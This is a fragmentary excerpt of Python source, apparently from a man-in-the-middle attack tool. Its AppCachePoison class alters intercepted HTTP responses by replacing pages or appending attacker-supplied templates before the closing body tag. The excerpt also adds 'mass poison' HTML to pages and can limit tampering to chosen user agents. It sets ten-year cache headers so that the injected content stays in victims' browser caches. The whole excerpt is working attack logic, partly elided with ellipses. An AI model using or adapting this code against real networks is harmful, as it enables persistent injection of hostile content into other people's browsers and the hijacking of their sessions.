...
class AppCachePoison(DummyResponseTamperer):
    ...
    def tamper(self, url, data, headers, req_headers, ip):
        ...
        if "enable_only_in_useragents" in self.config:
            ...
            if regexp and not re.search(regexp,req_headers["user-agent"]):
                logging.log(
                    logging.DEBUG,
                    f'Tampering disabled in this useragent ({req_headers["user-agent"]})',
                )
                return data
        ...
        if not s:
          ...
          return data
        logging.log(logging.WARNING, f"Found URL {url} in section {s['__name__']}")
        p = self.getTemplatePrefix(s)
        if element == 'tamper':
            logging.log(logging.WARNING, f"Poisoning tamper URL with template {p}")
            if os.path.exists(f'{p}.replace'): # replace whole content
                with open(f'{p}.replace', 'r') as f:
                    data = self.decorate(f.read(), s)
            elif os.path.exists(f'{p}.append'): # append file to body
                with open(f'{p}.append', 'r') as f:
                    appendix = self.decorate(f.read(), s)
                        # append to body
                data = re.sub(re.compile("</body>",re.IGNORECASE), f"{appendix}</body>", data)
    ...
    def tryMassPoison(self, url, data, headers, req_headers, ip):
        ...
        if 'mass_poison_url_match' not in self.config: # no url
            return data
        ...
        if not headers.hasHeader('content-type') or not re.search('html(;|$)', headers.getRawHeaders('content-type')[0]): #not HTML
            return data
        if (
            'mass_poison_useragent_match' in self.config
        ...
        logging.log(
            logging.WARNING,
            f"Adding AppCache mass poison for URL {url}, id {browser_id}",
        )
    ...
    def getMassPoisonHtml(self):
        ...
        for i in self.config:
            if (
                isinstance(self.config[i], dict)
                and self.config[i].has_key('tamper_url')
                and not self.config[i].get('skip_in_mass_poison', False)
            ):
    ...
    def cacheForFuture(self, headers):
        ten_years = 315569260
        headers.setRawHeaders("Cache-Control", [f"max-age={ten_years}"])
